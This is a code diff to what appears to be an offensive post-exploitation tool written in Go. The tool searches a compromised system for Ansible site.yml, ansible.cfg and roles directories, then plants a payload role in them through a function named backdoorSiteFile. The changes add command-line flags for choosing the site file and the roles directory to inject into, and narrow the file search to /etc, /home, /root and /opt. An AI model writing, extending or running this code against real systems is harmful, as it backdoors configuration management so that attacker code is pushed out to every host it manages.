@@ -51,6 +51,8 @@ type ansible []struct {
 	Become       bool                   `json:"become,omitempty"`
 	GatherFacts  string                 `json:"gather_facts,omitempty"`
 	Include      string                 `json:"include,omitempty"`
+	Import       string                 `json:"import_playbook,omitempty"`
+	When         interface{}            `json:"when,omitempty"`
 	Tags         []interface{}          `json:"tags,omitempty,flow"`
 	Roles        []interface{}          `json:"roles,flow,omitempty"`
 	Tasks        []interface{}          `json:"tasks,flow,omitempty"`
@@ -76,11 +78,14 @@ var (
 	ansibleRole    = a.PayloadName
 	uploadFileName = a.FileName
 	uploadFilePath = a.RemoteUploadFilePath
+	playbookDir    string
 	specific       bool
 	noColor        bool
 )
 
 func init() {
+	flag.StringVar(&files.siteFile, "s", "", "Manually specify the location of site.yml file (Recommended: also set basedir)")
+	flag.StringVar(&playbookDir, "p", "", "Location of roles directory to inject into")
 	flag.BoolVar(&cleanup, "c", false, "Activate cleanup using the file location in settings.json")
 	flag.BoolVar(&noColor, "d", false, "Disable color output")
 	flag.Parse()
@@ -120,7 +125,7 @@ func doCleanup(siteLoc string) {
 
 func getSiteFile() string {
 	var siteLoc string
-	fileList, _ := system.GetFileAndDirList([]string{"/"})
+	fileList, _ := system.GetFileAndDirList([]string{"/etc", "/home", "/root", "/opt"})
 	for _, file := range fileList {
 		if strings.Contains(file, "site.yml") && !strings.Contains(file, "~") &&
 			!strings.Contains(file, ".bak") && !strings.Contains(file, "#") {
@@ -135,7 +140,7 @@ func getSiteFile() string {
 
 func getCfgFile() string {
 	var cfgLoc string
-	fileList, _ := system.GetFileAndDirList([]string{"/"})
+	fileList, _ := system.GetFileAndDirList([]string{"/etc", "/home", "/root", "/opt"})
 	for _, file := range fileList {
 		matched, _ := regexp.MatchString(`ansible.cfg$`, file)
 		if matched && !strings.Contains(file, "~") &&
@@ -154,7 +159,7 @@ func getPlaybooks() []string {
 	locations := make(map[string]bool)
 	var playbookDirs []string
 
-	_, dirList := system.GetFileAndDirList([]string{"/"})
+	_, dirList := system.GetFileAndDirList([]string{"/etc", "/home", "/root", "/opt"})
 	for _, dir := range dirList {
 		d := filepath.Dir(dir)
 		if strings.Contains(d, "roles") && !strings.Contains(d, "~") &&
@@ -456,6 +461,8 @@ func backdoorSiteFile() {
 				true,
 				"",
 				"",
+				"",
+				nil,
 				nil,
 				roles,
 				nil,
@@ -563,8 +570,15 @@ func main() {
 	moseutils.NOCOLOR = noColor
 	moseutils.SetupLogger(debug)
 
+	// Check command line arg provided
+	if playbookDir != "" {
+		files.playbookDirs = append(files.playbookDirs, playbookDir)
+	}
+
 	// Find site.yml
-	files.siteFile = getSiteFile()
+	if files.siteFile == "" {
+		files.siteFile = getSiteFile()
+	}
 	log.Debug().Msgf("Site file: %v", files.siteFile)
 
 	if cleanup {
@@ -595,7 +609,9 @@ func main() {
 	log.Debug().Msgf("Ansible config file location: %v", files.cfgFile)
 
 	// Find where playbooks are located on the target system
-	files.playbookDirs = getPlaybooks()
+	if len(files.playbookDirs) == 0 {
+		files.playbookDirs = getPlaybooks()
+	}
 	log.Debug().Msgf("Directories with playbooks: %v", files.playbookDirs)
 
 	// Find host files
